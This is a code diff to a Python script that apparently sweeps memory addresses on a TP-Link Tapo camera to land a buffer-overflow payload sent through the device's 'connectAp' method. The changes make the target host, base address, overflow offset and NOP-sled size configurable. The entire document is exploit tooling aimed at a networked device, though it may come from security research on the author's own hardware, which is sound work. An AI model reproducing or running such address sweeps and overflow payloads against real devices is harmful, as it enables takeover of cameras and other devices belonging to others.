@@ -9,12 +9,14 @@ sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliver
 os.chdir("/Users/jemanuel/projects/franken_surveillance_system")
 import tapo_connectap_sc as T
 
-HOST = "192.168.4.33"
+HOST = os.environ.get("HOST", "192.168.4.243")
 MAC = "50:3D:D1:E3:E2:07"
-BASE = 0xbef80000
+BASE = int(os.environ.get("BASE", "0xbef00000"), 16)
 STEP = 0x400
 LOG = "/tmp/c460_incremental_sweep.log"
 STATE = "/tmp/c460_sweep_incremental.idx"
+OFFSET = int(os.environ.get("OFFSET", "1024"))
+SLED = int(os.environ.get("SLED", "512"))
 
 def log(m):
     with open(LOG, "a") as f:
@@ -87,7 +89,7 @@ def main():
             fired = 0
             while fired < 12:
                 addr = BASE + idx * STEP
-                b64 = T.build(1060, None, addr, sled=0, padpc=1, prefix=b"", bare=False, hang=True)
+                b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False, hang=True)
                 body = {"method": "connectAp", "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                 try:
                     T.req(HOST, sess, body, timeout=8)
